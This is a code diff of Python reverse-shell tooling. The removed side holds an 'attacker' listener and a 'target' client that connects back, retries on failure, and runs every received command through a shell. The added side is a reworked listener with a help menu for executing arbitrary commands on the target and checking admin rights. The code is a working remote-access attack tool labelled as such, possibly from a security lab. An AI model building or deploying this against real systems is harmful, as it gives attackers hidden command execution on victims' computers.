@@ -1,141 +1,94 @@
-# Server (Attacker) Script - server.py
-
-import socket
-import sys
-
-def start_server(host='0.0.0.0', port=4444):
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind((host, port))
-    server.listen(5)
-    print(f"[+] Server started on {host}:{port}")
-    print("[+] Waiting for connection...")
-    
-    # Accept connection
-    conn, addr = server.accept()
-    print(f"[+] Connection from {addr[0]}:{addr[1]}")
-    
-    # Get initial working directory
-    conn.send("pwd".encode())
-    cwd = conn.recv(4096).decode()
-    
-    # Command loop
-    while True:
-        try:
-            # Show prompt with current directory
-            cmd = input(f"{addr[0]}:{cwd}> ")
-            
-            if cmd.lower() == "exit":
-                conn.send("exit".encode())
-                break
-            
-            if not cmd.strip():
-                continue
-                
-            # Send command to client
-            conn.send(cmd.encode())
-            
-            # Get response
-            response = conn.recv(4096).decode()
-            
-            # Update working directory if needed
-            if cmd.startswith("cd "):
-                cwd = response
-                
-            print(response)
-            
-        except KeyboardInterrupt:
-            print("\n[!] Exiting...")
-            conn.send("exit".encode())
-            break
-    
-    conn.close()
-    server.close()
-
-if __name__ == "__main__":
-    try:
-        port = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
-        start_server(port=port)
-    except KeyboardInterrupt:
-        print("\n[!] Server terminated")
-
-
-# Client (Target) Script - client.py
-
 import socket
 import os
-import subprocess
-import sys
-import time
+import ctypes
 
-def connect_to_server(host, port=4444):
+def check_admin_access():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0    # Windows admin check (non-zero = admin)
+    except Exception as e:
+        return f"Error checking admin status: {e}"           # Handle any exceptions during check
+
+def connect():
+    print("=" * 50)
+    print("[+] Listening for incoming TCP connections on port 8080")
+    mySocket = socket.socket()
+    mySocket.bind(("192.168.83.128", 8080)) 
+    mySocket.listen(1)
+    connection, address = mySocket.accept()
+    print("=" * 50)
+    print(f"Connection established: {address}")
+    print("Type 'help' to see available commands")
+    
     while True:
         try:
-            # Create socket and connect
-            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client.connect((host, port))
+            command = input("Shell > ")
             
-            # Command handling loop
-            while True:
-                # Wait for command
-                cmd = client.recv(4096).decode()
+            # Help menu with available commands
+            if command == "help":
+                print("\nAvailable Commands:")
+                print("  pwd            - Show current working directory on target")
+                print("  ls             - List files and folders in current directory")
+                print("  cd <directory> - Change directory on target")
+                print("  checkUserLevel - Check admin privileges on target")
+                print("  terminate      - Close the connection and exit")
+                print("  <command>      - Execute any other system command on target\n")
+                continue
+            
+            # Check admin privileges locally
+            elif command == "checkUserLevel":
+                is_admin = check_admin_access()
+                print(f"Admin privileges: {'YES' if is_admin else 'NO'}")
+                continue
+            
+            # List current directory contents
+            elif command == "ls":
+                connection.send("dir".encode())  # Windows equivalent of ls
+                response = connection.recv(5000).decode()
+                print(response)
                 
-                # Exit command
-                if cmd == "exit":
+            # Get current working directory
+            elif command == "pwd":
+                connection.send("cd".encode())  # Windows command to show current directory
+                response = connection.recv(5000).decode()
+                print(response)
+                
+            # Close connection
+            elif "terminate" in command:
+                connection.send("terminate".encode())
+                connection.close()
+                print("Connection terminated")
+                break
+                
+            # Handle all other commands
+            else:
+                connection.send(command.encode())
+                response = connection.recv(8192).decode()  # Increased buffer size
+                if not response:
+                    print("Connection may have been closed by the client")
                     break
+                print(response)
                 
-                # Get current directory
-                elif cmd == "pwd":
-                    result = os.getcwd()
-                
-                # Change directory
-                elif cmd.startswith("cd "):
-                    directory = cmd[3:]
-                    try:
-                        os.chdir(directory)
-                        result = os.getcwd()
-                    except Exception as e:
-                        result = f"Error: {str(e)}"
-                
-                # List directory contents
-                elif cmd == "ls" or cmd == "dir":
-                    try:
-                        files = os.listdir(os.getcwd())
-                        result = "\n".join(files)
-                    except Exception as e:
-                        result = f"Error: {str(e)}"
-                
-                # Execute shell command
-                else:
-                    try:
-                        process = subprocess.Popen(
-                            cmd,
-                            shell=True,
-                            stdout=subprocess.PIPE,
-                            stderr=subprocess.PIPE
-                        )
-                        stdout, stderr = process.communicate()
-                        
-                        if stdout:
-                            result = stdout.decode()
-                        elif stderr:
-                            result = stderr.decode()
-                        else:
-                            result = "Command executed (no output)"
-                    except Exception as e:
-                        result = f"Error: {str(e)}"
-                
-                # Send result back to server
-                client.send(result.encode())
-            
-            client.close()
+        except BrokenPipeError:
+            print("Connection lost - the client has disconnected")
             break
-            
-        except Exception:
-            # If connection fails, wait and retry
-            time.sleep(5)
+        except ConnectionResetError:
+            print("Connection was reset by the client")
+            break
+        except Exception as e:
+            print(f"An error occurred: {e}")
+            break
+    
+    # Always ensure the socket is closed properly
+    try:
+        connection.close()
+    except:
+        pass
+
+def main():
+    try:
+        connect()
+    except Exception as e:
+        print(f"Failed to establish connection: {e}")
 
 if __name__ == "__main__":
-    server_host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
-    server_port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
-    connect_to_server(server_host, server_port)
+    main()
